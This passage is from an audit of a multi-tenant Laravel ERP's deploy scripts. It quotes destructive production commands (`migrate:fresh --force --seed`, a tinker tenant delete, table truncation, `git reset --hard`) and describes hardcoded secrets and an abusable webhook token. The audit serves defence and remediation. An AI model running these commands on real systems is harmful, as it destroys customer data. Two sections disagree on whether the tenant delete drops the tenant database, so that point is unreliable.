- Line 129 runs `tenant:populate-realistic-data 2m`. In `PopulateRealisticTenantDataCommand.php` lines 109-134, the truncate step runs unconditionally; the `--fresh` option is declared but never checked. It truncates InvoiceItem, Payment, AdditionalExpense, Invoice, PurchaseItem, Purchase, StockMovement, Expense, CashShift, StoreStock, Item, Category, Customer, Supplier and activity_logs, with FOREIGN_KEY_CHECKS=0.

**Overstated, which is why severity drops from critical to high:**
- `Tenant::where('id','tenant_sroor')->delete()` is a mass delete through the query builder, not `$model->delete()`. Eloquent model events (`$dispatchesEvents`) do not fire on a builder delete, so `TenantDeleted` is never dispatched. That means the `Jobs\DeleteDatabase` pipeline (`TenancyServiceProvider.php` lines 39-44) does not run and the tenant database is NOT dropped.
- What actually happens: the central tenant row is removed, the workspace becomes unreachable, and its database is left orphaned. Its domains are also removed if the FK cascades. Recovery is possible but the outage is real.
- Tenant `2m` looks like a demo or showcase tenant. The command creates it with seeded demo branding and describes itself as generating a 1-year dataset. Wiping it is destructive by design, and is only catastrophic if 2m becomes a real customer.

**Real residual risks:**
- Every run makes the `tenant_sroor` workspace unreachable.
- 2m is wiped on every run.
- All other tenants never get migrated.
- Production runs a non-SaaS branch.

**Additional finding:** the same file hardcodes production secrets: Laravel APP_KEY at line 85 and the MySQL DB password at line 99 (values not reproduced).

### 8. [HIGH] MySQL DB passwords and production APP_KEYs are hardcoded in tracked scripts (some pushed), and DB passwords are passed on the remote command line
- **Location:** `D:/projects/sroor/deploy_root_baraa.py:85`
- **Effort:** M
- **Evidence:** These secrets are all tracked. Production APP_KEY: deploy_root_baraa.py:85 (central SaaS), deploy_to_sroor_subdomain.py:54, deploy_with_mysql.py:42, fix_shipping_php83.py:28. MySQL DB password: deploy_root_baraa.py:99 (central DB user [HOSTING_ACCOUNT]_baraa_admin), deploy_to_sroor_subdomain.py:70, deploy_with_mysql.py:58, fix_shipping_php83.py:44, backup_sroor_db.py:11 and restore_sroor_db.py:11 (DB_PASS for [HOSTING_ACCOUNT]). git grep finds the APP_KEY/DB_PASSWORD files deploy_root_baraa.py, deploy_to_sroor_subdomain.py, deploy_with_mysql.py, fix_shipping_php83.py and deploy_remote.py on origin/feature/multi-tenant. backup_sroor_db.py:34 and restore_sroor_db.py:20 pass --password="..." to mysqldump/mysql on a shared host. The SSH and DB passwords follow the same pattern, which suggests password reuse.
- **Impact:** With a leaked APP_KEY, an attacker can forge or decrypt encrypted cookies, signed URLs and any encrypted casts, and session payloads become exposed. With the central DB password, an attacker can read and modify plans, subscriptions and the tenant registry. The passwords are also visible in the process list on shared hosting.
- **Recommendation:** Rotate the central and sroor DB passwords and regenerate the APP_KEYs. If encrypted columns exist, plan a re-encryption. Keep .env only on the server, never generated from a tracked script. Use ~/.my.cnf or MYSQL_PWD for dumps.
- **Verification:** I confirmed this from the code, reading only redacted output. git ls-files shows all seven scripts are tracked: deploy_root_baraa.py, deploy_to_sroor_subdomain.py, deploy_with_mysql.py, fix_shipping_php83.py, backup_sroor_db.py, restore_sroor_db.py and deploy_remote.py.

Secrets found (type only):
- **Real-format Laravel APP_KEY** (base64 string, 59-character line, so a real 32-byte key and not a placeholder): deploy_root_baraa.py:85, deploy_to_sroor_subdomain.py:54, deploy_with_mysql.py:42, fix_shipping_php83.py:28.
- **Literal MySQL DB_PASSWORD**: deploy_root_baraa.py:99, deploy_to_sroor_subdomain.py:70, deploy_with_mysql.py:58, fix_shipping_php83.py:44.
- **DB_PASS constant**: backup_sroor_db.py:11 and restore_sroor_db.py:11.
- **Literal SSH password in ssh.connect(...)**, which the finding understates: deploy_root_baraa.py:47, deploy_to_sroor_subdomain.py:23, deploy_with_mysql.py:23, fix_shipping_php83.py:13, backup_sroor_db.py:27, restore_sroor_db.py:17.

The DB password is passed on the remote command line through --password= in the mysqldump command at backup_sroor_db.py:34 and the mysql command at restore_sroor_db.py:20.

Push status: git cat-file confirms that the four APP_KEY/DB_PASSWORD files exist on origin/feature/multi-tenant. backup_sroor_db.py and restore_sroor_db.py are tracked locally but are not on that remote branch yet. The configured remote is github.com/kamalsroor1/erp-hub. I could not tell from the code whether that repo is public or private.

No mitigation exists in the repo. .gitignore excludes only .env, .env.backup and .env.production, not these scripts.

One claim I could not verify from code: password reuse. I did not compare the values, to avoid handling the secrets.

The finding is real and High fits. Keys and passwords belong in .env files that git ignores, and these values are already in git history, so they should be changed (new APP_KEY, new DB passwords, new SSH password), not just deleted from the files.

### 9. [HIGH] Production admin login credentials are hardcoded in live browser tests and seed scripts, and the admin password is a trivial default
- **Location:** `D:/projects/sroor/test_live_browser.py:24`
- **Effort:** S
- **Evidence:** Type: production application admin password, with the phone number in clear. test_live_browser.py:21-24 logs into https://sroor.baraa-solutions.com with page.fill on hardcoded values, and its own log line says the password is the literal default word. Similar hardcoded logins: test_live_activity_logs.py:13, test_live_touch_pos.py:13, test_production_verification.py:14, test_sidebar_click.py:14. seed_fresh_direct.py:58,69 and verify_production_users.py:26-30 contain a second admin phone/password pair. fix_local_admin.php:25 also contains one. By contrast, tests_e2e/config.py:7-8 reads E2E_ADMIN_PHONE/E2E_ADMIN_PASSWORD from the environment.
- **Impact:** Anyone with repo access can log into the production ERP as admin. Running the live tests also writes test data into the real tenant.
- **Recommendation:** Change the production admin passwords now. Remove the live-production test scripts, or move them to tests_e2e with env-only credentials against a staging tenant.
- **Verification:** The finding is confirmed, and every file it names is tracked in git (`git ls-files`). The browser tests open https://sroor.baraa-solutions.com/login and fill in a hard-coded admin phone and password, which is the trivial default word: test_live_browser.py:23-24 (its own log line at :22 prints the pair), test_live_activity_logs.py:12-13, test_live_touch_pos.py:12-13, test_production_verification.py:12-14 and test_sidebar_click.py:13-14. seed_fresh_direct.py:53-69 runs PHP on the production host over SSH. That PHP creates two super admins with literal bcrypt passwords: the default word, and a second pair whose password is a simple digit sequence. It then checks both logins with Auth::attempt at :84-87. verify_production_users.py:25-30 checks the same two pairs on production. fix_local_admin.php:25 sets the default password, though that script looks local-only. The backend seeders (DatabaseSeeder.php:26,38, RealisticEnterpriseDataSeeder.php:37, TenantSampleSeeder.php:29) use the same defaults.

There is something worse that the finding did not mention. seed_fresh_direct.py:11-14 and verify_production_users.py:3-6 hold literal SSH host, user and password values for the production server, used with paramiko.connect and AutoAddPolicy.

Corrections:
1. The 'by contrast' point about tests_e2e/config.py is only partly right. It does read env vars, but its fallbacks (:8, :12) are the same trivial passwords, and BASE_URL defaults to localhost.
2. The impact claim that 'running the live tests writes test data into the real tenant' is overstated for the Playwright scripts I checked (test_production_verification.py, test_live_touch_pos.py, test_live_browser.py). They only navigate and assert, with no submit or create step. The production writes come from seed_fresh_direct.py over SSH.

The code cannot prove that the live production password still equals the default, but the repo's own production seed script sets it that way. High severity is justified, arguably critical when the committed SSH credentials are counted too.

### 10. [HIGH] Deploy scripts target three single-tenant Hostinger paths, ignore failures and reset to `main`; none roll out tenant migrations
- **Location:** `D:/projects/sroor/deploy.sh:29`
- **Effort:** L
- **Evidence:** deploy.sh:14 runs `git reset --hard origin/main`, then lines 29-37 run `migrate --force --seed || true` and config/route/view cache, each with `|| true`. Lines 41-62 overwrite index.php and an .htaccess that serves existing files directly, which would expose root files when the repo root is the docroot. deploy_live_safe.py:34-37 and deploy_all_locations.py:11-14 loop over sroor.baraa-solutions.com, baraa-solutions.com/public_html/sroor and shipping.baraa-solutions.com, with migrate || true, and deploy_all_locations.py:46 runs a full `db:seed --force` in production. deploy.bat just calls deploy_local_to_server.py (git reset plus migrate on two prod dirs). cron_schedule.sh:2 runs schedule:run with /usr/bin/php (not php84) only in the sroor dir. The only `tenants:migrate` anywhere in the root scripts is deploy_root_baraa.py:125, for a single tenant.
- **Impact:** Deploys report success while migrations or caches failed, and production keeps running with a half-applied schema. Full seeders re-run against live data. For the SaaS, tenant schemas are never migrated on release.
- **Recommendation:** Replace everything with a single CI-driven deploy: build assets, run artisan test in backend/, a maintenance window, `migrate --force`, `tenants:migrate --force`, cache, then up, with set -euo pipefail and no `|| true`. Delete deploy.sh, deploy.bat, update_webhook.php and the 15 deploy_*.py variants.
- **Verification:** I read the scripts and the finding holds. A few details are wrong, and there is more evidence than it claims.

Confirmed in D:/projects/sroor/deploy.sh:
- Line 2 sets `set -e`, but every risky step has `|| true` after it, so failures are swallowed: composer at line 28, key:generate at 31, `migrate --force --seed` at 32, the caches at 35-38. Line 69 then always prints "Finished Successfully".
- Line 14 runs `git reset --hard origin/main`.
- Line 5 deploys into public_html. Lines 40-55 write index.php, and lines 57-64 write an .htaccess whose `RewriteCond %{REQUEST_FILENAME} !-f` serves any existing file directly. Line 67 makes .env mode 644. If the repo root is the docroot, root files are exposed.
- The line numbers in the claim are slightly off: migrate is at line 32, not 29.

Confirmed in the Python scripts:
- deploy_live_safe.py:35-37 targets the three Hostinger paths. Line 58 resets to origin/main. Lines 67-68 run migrate and the PermissionsSeeder, and lines 72-75 rebuild caches, all with `|| true`.
- deploy_all_locations.py:12-14 targets the same three paths, line 34 resets to origin/main, and line 46 runs a full `php artisan db:seed --force` in production.
- Correction: deploy_all_locations.py uses `set -e` with no `|| true`, so the "ignore failures" part does not apply to that script.
- deploy.bat:9 only calls deploy_local_to_server.py. That script resets to origin/main (line 49) and migrates (line 54) on two prod dirs (lines 23-24).
- cron_schedule.sh:3 (not line 2) runs `/usr/bin/php artisan schedule:run`, only in the sroor dir.

On tenant migrations:
- Outside vendor, `tenants:migrate` appears in only four places: deploy_root_baraa.py:125, the manual per-tenant endpoint SuperAdminApiController::runTenantMigrations (lines 222-228), PopulateRealisticTenantDataCommand:106, and the parameters block in config/tenancy.php.
- deploy_root_baraa.py:125 migrates one tenant (`--tenants=2m`) with `|| true`. Line 124 hard-deletes the tenant record `tenant_sroor` in production through tinker. Lines 71-72 deploy the branch feature/api-migration, not this SaaS branch.
- TenancyServiceProvider:29 runs MigrateDatabase only when a tenant is created. Nothing migrates all existing tenants on release.

The finding misses one deploy path. .github/workflows/deploy.yml deploys automatically on every push to main or master:
- Line 49 calls update_webhook.php with a deploy token hardcoded in the URL (secret type: shared deploy token; the same token is hardcoded in update_webhook.php:4).
- The `|| echo "Deployment triggered successfully."` on that line means the CI step never fails.
- The webhook (update_webhook.php:33-36) does `git reset --hard origin/main` and migrates the central database only, never the tenants.
- The CI test job runs composer and `php artisan test` from the repo root, but the only composer.json is in backend/, so the tests cannot gate the deploy.

Severity: none of these release paths migrates the tenant databases, several hide failures, and a full seeder plus a tenant delete run against production. High stands.

### 11. [HIGH] The deploy script deletes a tenant and wipes the 2m tenant's invoices, stock and payments on every run
- **Location:** `D:/projects/sroor/deploy_root_baraa.py:124`
- **Effort:** S
- **Evidence:** This is the newest deploy script and the only one that knows about backend/ and stancl tenancy (last touched in v1.0.129). Every run does three things. (1) Line 124 runs `artisan tinker --execute="\App\Models\Tenant::where('id','tenant_sroor')->delete();" || true`. TenancyServiceProvider.php:39-44 wires TenantDeleted to Jobs\DeleteDatabase with shouldBeQueued(false). (2) Line 129 runs `artisan tenant:populate-realistic-data 2m` unconditionally. (3) In PopulateRealisticTenantDataCommand.php:107-134, that command calls truncate() on Invoice, InvoiceItem, Payment, StockMovement, StoreStock, Item, Customer, Supplier, CashShift, Expense and activity_logs, with FOREIGN_KEY_CHECKS=0. Its `--fresh` option (line 40) is never checked, and the command has no environment or confirm guard.
- **Impact:** Running the deploy script deletes the 'tenant_sroor' tenant row. Through the TenantDeleted listener, that also drops the tenant's MySQL database. The same run then replaces all operational data of tenant '2m' (2m.baraa-solutions.com) with generated data. A real customer on either tenant loses all invoices, stock and treasury data with no backup step. Because the line ends in `|| true`, a failed delete is not even reported.
- **Recommendation:** Remove lines 124 and 129 from every deploy path now. In PopulateRealisticTenantDataCommand, refuse to run when app()->environment('production'), and only truncate when --fresh is passed and confirmed. Keep demo seeding as a separate manual command that never runs during a deploy.
- **Verification:** The finding is real; I confirmed it in the code. The impact is somewhat overstated.

What the code shows:
- D:/projects/sroor/deploy_root_baraa.py:69-72 force-resets the server checkout to origin/feature/api-migration. That branch contains the same lines 124 and 129 and the same command file.
- Line 123 runs `migrate --force`.
- Line 124 runs `artisan tinker --execute="\App\Models\Tenant::where('id','tenant_sroor')->delete();" || true`.
- Line 129 runs `artisan tenant:populate-realistic-data 2m` with no flags.
- The heredoc in deploy_script uses `set -e`, but the `|| true` hides any failure of line 124.

The delete does drop the tenant database:
- backend/app/Models/Tenant.php:10 extends the stancl BaseTenant and does not use SoftDeletes. So `delete()` is a real delete and fires TenantDeleted.
- backend/app/Providers/TenancyServiceProvider.php:39-44 maps TenantDeleted to Jobs\DeleteDatabase with shouldBeQueued(false), so the job runs synchronously.
- No observer, policy or guard prevents this.

The populate command wipes data with no guard:
- In backend/app/Console/Commands/PopulateRealisticTenantDataCommand.php:38-40 the signature declares `--fresh`, but handle() never reads it.
- Lines 110-138 disable FOREIGN_KEY_CHECKS and truncate:
  - Invoice, InvoiceItem, Payment, AdditionalExpense
  - Purchase, PurchaseItem, StockMovement, StoreStock
  - Item, Category, Customer, Supplier
  - Expense, CashShift and activity_logs
- There is no environment check, no confirm() call and no backup step.

Why I lowered it from critical to high:
1. The tenant_sroor delete only matters on the first run. After that the tenant row is gone and line 124 does nothing. "Deletes a tenant on every run" is only true once.
2. The 2m tenant looks like a demo or showcase workspace. Lines 56-87 of the command create it themselves if it is missing, with seeded demo identity data. The code alone cannot show that a paying customer's data is lost. The wipe of 2m's operational data on every deploy is still certain.

It is still a serious production hazard. Running the normal deploy script destroys a production tenant database the first time, wipes 2m every time, and hides the delete's failure. No staging or production guard exists anywhere in this path.

Separate issue in the same file: it hard-codes several secrets in plain text, which needs its own finding. I am giving types only:
- line 12: SSH password
- line 85: Laravel APP_KEY
- line 99: MySQL DB password

The file also sets AutoAddPolicy for SSH host keys (line 46) and runs `git add .` and push on every deploy (lines 30-32).

### 12. [HIGH] Five deploy scripts run `migrate:fresh --force --seed` against production paths
- **Location:** `D:/projects/sroor/deploy_sroor.py:68`
- **Effort:** S
- **Evidence:** deploy_sroor.py:68 runs `$PHP84 artisan migrate:fresh --force --seed` on TARGET_DIR=/home/[HOSTING_ACCOUNT]/domains/baraa-solutions.com/public_html/sroor. The same command appears in deploy_hostinger_php84.py:56, deploy_subdomain.py:54, deploy_hostinger_php83.py:50 and deploy_with_mysql.py:79. All five sit next to 'safe' scripts in the repo root with no guard and no warning.
- **Impact:** Running the wrong script by mistake drops every table in the production database and replaces it with seed data. The data cannot be recovered unless an off-site backup exists, and the Telegram backup covers only the central DB (see below).
- **Recommendation:** Delete these scripts, or move them under a dev-only folder that refuses production hosts. Keep one deploy entry point. Add an app-level guard as well, for example DB::prohibitDestructiveCommands(app()->isProduction()) in AppServiceProvider.
- **Verification:** The finding holds. All five scripts in the repo root connect by SSH (paramiko) to the Hostinger host and run `migrate:fresh --force --seed` with no prompt, no environment check and no backup step:
- deploy_sroor.py:68 (`$PHP84 artisan migrate:fresh --force --seed`, cwd public_html/sroor)
- deploy_hostinger_php84.py:56 (public_html/shipping)
- deploy_subdomain.py:54 (shipping.baraa-solutions.com/public_html)
- deploy_hostinger_php83.py:50 (public_html/sroor)
- deploy_with_mysql.py:79 (public_html/sroor)

Each one runs under `set -e` after `git reset --hard origin/main`. origin/main still has `artisan` at the repo root (checked with git ls-tree), so the command would really run if a script were started today.

deploy_with_mysql.py is the worst of the five:
- It overwrites .env with a hardcoded production MySQL config (DB_DATABASE=[HOSTING_ACCOUNT], APP_ENV=production). Lines 39-72 also contain a hardcoded database password; I am reporting only that it exists, not its value.
- It runs `key:generate --force` (line 78), which rotates APP_KEY and makes previously encrypted data and sessions unreadable.
- It then wipes that database (line 79).

The sqlite-flavoured scripts (sroor, php83) only copy .env.example when .env is missing. If the server's .env was already pointed at MySQL, for example by deploy_with_mysql.py, their migrate:fresh would wipe production MySQL as well.

public_html/sroor is a current live target. deploy_live_safe.py:35-37 deploys there and uses `artisan migrate --force` (line 67), so the dangerous scripts sit right next to the safe one and point at the same directories.

I found no guard anywhere: no confirmation prompt, no APP_ENV check and no backup before the wipe.

Why I lowered it to high instead of critical: nothing triggers these scripts automatically. They are not called by CI or by other scripts that I could see, so the damage needs an operator to start the wrong file by hand. Two of the five point at the shipping/ directories, which may be a separate install. The point about Telegram backups covering only the central DB was not verified here. Even so, the operator-error risk of irreversible production data loss is real and backed by the code.

### 13. [HIGH] The deploy webhook token is hardcoded in the CI file and in update_webhook.php, and CI reports success even when the deploy fails
- **Location:** `D:/projects/sroor/.github/workflows/deploy.yml:49`
- **Effort:** S
- **Evidence:** Line 49 calls curl with `update_webhook.php?token=<literal>`. The secret type is a deploy webhook token, and it appears both in the URL and in update_webhook.php:4 ($secretToken). The webhook accepts the token by GET (line 6) and then runs `git reset --hard origin/main` and `artisan migrate --force` (lines 32-36). It returns the full command output (line 44). The CI step ends with `|| echo "Deployment triggered successfully."`, so it can never fail. Under the current layout the root .htaccess rewrites every request into public/, so the endpoint probably isn't reachable at all; that is why CI tries an `index.php/` fallback.
- **Impact:** Anyone with read access to the repo or to the server access logs (the token is in the query string) can trigger a production reset and migrate. Because the step always passes, a broken deploy looks successful. The endpoint also leaks command output.
- **Recommendation:** Rotate the token. Delete update_webhook.php and the curl step. Deploy from GitHub Actions over SSH with a deploy key stored in GitHub Secrets and a pinned known_hosts entry, and fail the job on a non-zero exit.
- **Verification:** The finding is confirmed in the code. One sub-claim is wrong in a way that makes the problem worse.

1. Hardcoded secret. In D:/projects/sroor/.github/workflows/deploy.yml:49, a literal deploy webhook token appears in the curl query string twice. The workflow contains no `secrets.` reference at all. The same 33-character value is hardcoded as `$secretToken` at line 4 of both D:/projects/sroor/update_webhook.php and D:/projects/sroor/backend/public/update_webhook.php. I compared the values for equality without printing them.
   - All of these files are tracked in git, and the workflow also exists on `main`. Anyone with repo read access has the token.

2. How the endpoint uses the token.
   - Line 6 accepts the token from either GET or POST.
   - The comparison uses `!==`, not `hash_equals`.
   - Lines 32-37 then run `git fetch --all`, `git reset --hard origin/main`, `artisan migrate --force` and `optimize:clear`.
   - Lines 39-45 always return `status: success` along with the full exec output. That output includes git and migration output, so internal information leaks.
   - No exit codes are checked.

3. CI always passes. Line 49 ends with `|| echo "Deployment triggered successfully."`, so the step exits 0 even when both curls fail. Even when a curl succeeds, the webhook itself always reports success. A broken deploy therefore looks green from both ends.

4. The "probably not reachable" sub-claim is wrong. The root .htaccess rewrites requests into `public/`. But backend/public/update_webhook.php exists, and it uses `dirname(__DIR__)` as the project root. So under the public/ rewrite the endpoint is most likely reachable, which supports the impact claim. I could not check the live server without breaking the read-only rules.

5. Mitigating factors I found: none. There is no IP allowlist, no HMAC, no rate limit and no middleware, because this is a standalone PHP file outside Laravel. Anyone who has the token can force a production hard-reset plus migrate.

High severity is justified. The token needs rotating, since it is in git history.

### 14. [HIGH] Production SSH, DB and APP_KEY secrets are hardcoded in about 80 tracked root scripts, and host keys are not verified
- **Location:** `D:/projects/sroor/deploy_root_baraa.py:12`
- **Effort:** M
- **Evidence:** deploy_root_baraa.py contains the SSH password at :12 (type: Hostinger SSH password for [HOSTING_ACCOUNT]@[SERVER_IP]:65002). The production .env it writes on every deploy holds the Laravel APP_KEY at :85 and the central MySQL password at :99. A grep finds 80 tracked root scripts with literal PASS/PASSWORD assignments, for example deploy_local_to_server.py:20 and deploy_live_safe.py:9. 90 tracked .py files use paramiko AutoAddPolicy, so host keys are never checked. deploy_local_to_server.py:70-72 also prints default admin credentials.
- **Impact:** Anyone with a clone or a fork has full shell access to the Hostinger account, which holds all tenants' databases and every site on that account. The APP_KEY in git lets an attacker forge signed or encrypted payloads, for example signed URLs and cookies. AutoAddPolicy allows a MITM to capture the password.
- **Recommendation:** Rotate the SSH password, the DB password and the APP_KEY now (rotating APP_KEY logs out sessions; no 'encrypted' casts were found). Switch to key-only SSH. Move all values to an untracked .env or to GitHub Secrets. Remove the scripts, then purge them from history with git filter-repo.
- **Verification:** I confirmed this from the code; all values below are redacted. D:/projects/sroor/deploy_root_baraa.py is tracked in git (last touched in commit a2e603ab). It sets HOST, PORT=65002 and USER as literals at lines 9-11, and line 12 sets PASS to a literal SSH password, not a value read from the environment. The script contains no os.environ or getenv calls. The embedded .env text has APP_KEY at line 85, a 50-character base64-prefixed Laravel key, and DB_PASSWORD at line 99, a 22-character literal. Line 46 uses paramiko AutoAddPolicy, so host keys are not checked. Across the repo, `git ls-files '*.py'` finds 80 tracked files with literal PASS/PASSWORD string assignments and 90 tracked files that use AutoAddPolicy, matching the claimed counts. deploy_local_to_server.py also has a literal PASS at line 20, and lines 70-72 print the default admin email and password. .gitignore does not exclude these scripts. One part of the impact is overstated: "anyone with a clone or fork" depends on who can see the GitHub repos (remotes are kamalsroor1/sroor-cofe-erp and erp-hub), which I could not check from the code and which may be private. Even so, the secrets are in git history, so anyone with repo access now or later has them, and every credential needs rotating. The rest of the impact holds: shell access to a shared Hostinger account, an APP_KEY usable to forge signed and encrypted payloads, and a MITM risk from AutoAddPolicy. High severity is justified.

### 15. [HIGH] Only one tenant's database is migrated on deploy; every other tenant keeps the old schema
- **Location:** `D:/projects/sroor/deploy_root_baraa.py:125`
- **Effort:** S
- **Evidence:** Line 125 runs `artisan tenants:migrate --tenants=2m --force || true`. None of the other scripts (deploy.sh, update_webhook.php, deploy_local_to_server.py, deploy_live_safe.py) calls tenants:migrate; they only run central `migrate`. The `|| true` hides any failure.
- **Impact:** After each release, every tenant except 2m runs new code against an old schema, and requests that touch new columns or tables fail with SQL errors. Selling to more tenants makes this worse with each release. Partial failures go unnoticed.
- **Recommendation:** The deploy should run `artisan migrate --force` (central) and then `artisan tenants:migrate --force` for all tenants, with no `|| true`. Abort and roll back if either fails. Consider writing a per-tenant migration status report.
- **Verification:** The finding holds. D:/projects/sroor/deploy_root_baraa.py:123-125 runs a central `artisan migrate --force` and then only `artisan tenants:migrate --tenants=2m --force || true`, so a failure on that one tenant is also hidden. No other deploy path migrates tenants. The automated CI path is .github/workflows/deploy.yml:47-50, which curls update_webhook.php after the tests pass. That webhook (update_webhook.php:36 and backend/public/update_webhook.php:36) runs only `artisan migrate --force`, which uses the central migration path. deploy.sh:32 (`migrate --force --seed || true`), deploy_local_to_server.py:54, deploy_live_safe.py:67 and deploy_all_locations.py:44 also run only central migrate. A repo-wide grep finds `tenants:migrate` in just two other places. (1) backend/app/Console/Commands/PopulateRealisticTenantDataCommand.php:106 migrates one tenant while seeding demo data. (2) SuperAdminApiController::runTenantMigrations (SuperAdminApiController.php:221-238, route api.php:206) is a manual, one-tenant-at-a-time button. Both are manual mitigations, not part of a deploy. The button also leaves out `--force`, so in production (APP_ENV=production) the non-interactive confirmation will probably refuse to run and still report success. TenancyServiceProvider:29 runs Jobs\MigrateDatabase only when a tenant is created, so new tenants start on the current schema but existing tenants never get later migrations. The tenant migrations folder keeps growing (latest are 2026_08_25 add_pos_display_fields_to_items_table, add_color_to_categories_table), so each release that adds tenant columns leaves every tenant except '2m' on the old schema until someone migrates each tenant by hand. Severity stays high for a DB-per-tenant SaaS. Side notes, with types only and no values: deploy_root_baraa.py:99 has a hardcoded production DB password, and .github/workflows/deploy.yml:50 has a hardcoded deploy-webhook token in the URL query string.

### 16. [HIGH] Deploys are not atomic, have no maintenance mode or rollback, and every step's failure is ignored
- **Location:** `D:/projects/sroor/deploy.sh:32`
- **Effort:** L
- **Evidence:** deploy.sh:28-38 ends every step in `|| true`: composer install, key:generate, `migrate --force --seed`, and the caches. deploy_live_safe.py:67-75 does the same. deploy_root_baraa.py runs `git reset --hard` in the live erp_repo (line 72) and `composer install` in place (line 120). It then does `rm -rf $PUBLIC_DIR/build` followed by cp (lines 151-153). No script anywhere runs `artisan down` or `artisan up`, and there is no release directory, symlink swap or previous-release rollback. The scripts disagree on PHP: deploy_root_baraa.py uses /opt/alt/php83, deploy.sh and the others use php84, and cron_schedule.sh:3 uses /usr/bin/php.
- **Impact:** During every deploy, live POS requests hit mixed old and new code, half-installed vendor files, or missing build/ assets (404s and a white screen). When a migration fails, the new code still goes live against the old schema and the script prints 'Successfully'. There is no quick way back to the last good release.
- **Recommendation:** Build the release in CI as one artifact (vendor plus public/build). Upload it to releases/<sha> and link the shared .env and storage into it. Run `artisan down --render=...`, then migrate, tenants:migrate, the caches and a health check on /up (already defined in bootstrap/app.php:13). Swap the `current` symlink and run `artisan up`. On failure, point the symlink back. Pin one PHP binary (8.3, to match the composer.lock platform) everywhere, including cron.
- **Verification:** I checked the code and the finding holds, with one claim overstated.

Confirmed:
- **deploy.sh ignores every failure.** It has `set -e` at line 2, but each step ends in `|| true`, which cancels it: composer install (28), key:generate (31), `migrate --force --seed` (32) and the caches (35-38). It runs `git reset --hard origin/main` in the live public_html (14) and always prints "Finished Successfully" (69).
- **deploy_live_safe.py does the same.** It runs `git reset --hard` in place, then `migrate --force || true`, the seeder and the caches, all with `|| true`, and then prints "Successfully deployed safely".
- **The production deploy path is no safer.** .github/workflows/deploy.yml:49 deploys by calling update_webhook.php. That file (repo root, and also backend/public/update_webhook.php) runs `exec('git reset --hard origin/main')` and `exec(artisan migrate --force)` at lines 32-37. It never checks an exit code and has no maintenance mode.
- **No maintenance mode, release directory or rollback anywhere.** Searching all scripts outside .claude/worktrees found no `artisan down` or `artisan up`. There is no releases/ directory, no symlink swap and no way back to the previous release.
- **deploy_root_baraa.py deploys in place.** It runs `git reset --hard` in erp_repo, `composer install` in place, then `rm -rf $PUBLIC_DIR/build` followed by cp. That leaves a window where build assets are missing.
- **PHP versions disagree.** deploy_root_baraa.py uses php83, deploy.sh and deploy_live_safe use php84, and cron_schedule.sh:3 uses /usr/bin/php.

Overstated:
- **Not every script ignores failures.** deploy_root_baraa.py's remote script starts with `set -e`, and its composer install, central `migrate --force` and most seeders have no `|| true`. In that script a failure does stop the deploy. But code has already been reset by then, so the site is left half-deployed rather than rolled back.

Extra risks found in deploy_root_baraa.py:
- On every deploy it runs a tinker command that deletes a Tenant record, plus `tenant:populate-realistic-data`, against the production central DB.
- It contains secrets in plaintext: a Laravel APP_KEY and a DB password inside the heredoc .env, roughly lines 80-95.
- update_webhook.php:4 and deploy.yml:49 contain a hard-coded deploy token.

I kept the severity at high. These are the real deploy paths for a live POS. A failed migration ships the new code against the old schema and still reports success, and there is no rollback.

### 17. [HIGH] The deploy script overwrites the production .env on every run, and deploy.sh regenerates APP_KEY on every run
- **Location:** `D:/projects/sroor/deploy_root_baraa.py:82`
- **Effort:** S
- **Evidence:** deploy_root_baraa.py:82-117 runs `cat << 'EOF' > .env` with hardcoded values, including QUEUE_CONNECTION=sync and SESSION_LIFETIME=43200. Any change made on the server is lost on the next deploy. deploy.sh:31, deploy_sroor.py and deploy_hostinger_php84.py all run `artisan key:generate --force` on every deploy, which rotates the APP_KEY.
- **Impact:** Config and secrets are tied to one developer's script, so production config cannot be managed or audited per environment. Each key rotation invalidates sessions, signed URLs and any encrypted data. The scheduled `queue:work` (routes/console.php:12) does nothing while QUEUE_CONNECTION=sync, so jobs that should be async run inside web requests.
- **Recommendation:** Keep one shared .env outside the release directory that deploys never write. Remove key:generate from all deploy paths. Choose and document a queue driver: the database driver plus the scheduler-run worker suits Hostinger.
- **Verification:** Confirmed in the code. Two corrections and one addition.

**The .env overwrite is real.**
- deploy_root_baraa.py, a git-tracked file, runs `cat << 'EOF' > .env` at about line 82.
- The block contains hardcoded values: APP_ENV=production, QUEUE_CONNECTION=sync, SESSION_LIFETIME=43200, CACHE_STORE=file and others.
- Any change made to .env on the server is lost on the next run.

**Correction 1: this script does not rotate APP_KEY.** It writes a fixed, hardcoded APP_KEY into .env.

**Addition: secrets are committed to git.** The same script contains a literal APP_KEY (secret type: Laravel encryption key) and a literal DB_PASSWORD (secret type: MySQL credential) for the production central database. I did not reproduce the values. This is worse than the claimed problem. The same script also runs:
- `git reset --hard origin/feature/api-migration`, a different branch from feature/multi-tenant.
- A tinker command that deletes tenant `tenant_sroor`.

**Key rotation is confirmed in the other scripts.** Each runs `artisan key:generate --force`, with no check for an existing key:
- deploy.sh:31. Line 24 only copies .env.example when .env is missing, but line 31 regenerates the key every time anyway.
- deploy_sroor.py:59
- deploy_hostinger_php84.py:47
- deploy_hostinger_php83.py:46
- deploy_remote.py:48
- deploy_subdomain.py:50
- deploy_to_sroor_subdomain.py:87
- deploy_with_mysql.py:78

Each rotation invalidates encrypted cookies, sessions, signed URLs and any data stored with Crypt or encrypted casts.

**The queue impact is real but narrower than claimed.**
- backend/routes/console.php:12 schedules `queue:work --stop-when-empty`.
- With QUEUE_CONNECTION=sync, that worker never has anything to process.
- The ShouldQueue jobs (CheckLowStockAlertJob, CheckOverdueShiftsJob, SendDailySummaryReportJob, SendTelegramDatabaseBackupJob) then run in the same process as their caller. These look like scheduled jobs, so they would mostly run inside the scheduler, not inside web requests.

**Correction 2: these are ad-hoc scripts, not one canonical pipeline.** That limits the scope to whoever runs them, but each one can damage production when it runs. Severity stays high.

### 18. [HIGH] Scheduled backups and Telegram reports cover only the central DB, and the cron path is stale
- **Location:** `D:/projects/sroor/backend/app/Services/DatabaseBackupService.php:39`
- **Effort:** M
- **Evidence:** createSqlGzBackup() dumps the tables of `DB::connection()`, the default connection (SHOW TABLES at line 43). backup:telegram (routes/console.php:37) runs from the scheduler in central context. No tenancy, tenancy()->runForMultiple or Tenant reference was found in SendTelegramDatabaseBackupCommand, SendDailyTelegramSummaryCommand or SendLowStockTelegramAlertCommand. cron_schedule.sh:2 still cd's to sroor.baraa-solutions.com/public_html, the old layout where artisan sat at the repo root, and calls /usr/bin/php.
- **Impact:** No tenant's business data (invoices, stock, treasury) is backed up automatically. Combined with the destructive deploy scripts, data loss cannot be recovered. Daily summary and low-stock alerts either run against the central DB, where the tables don't exist or are empty, or fail.
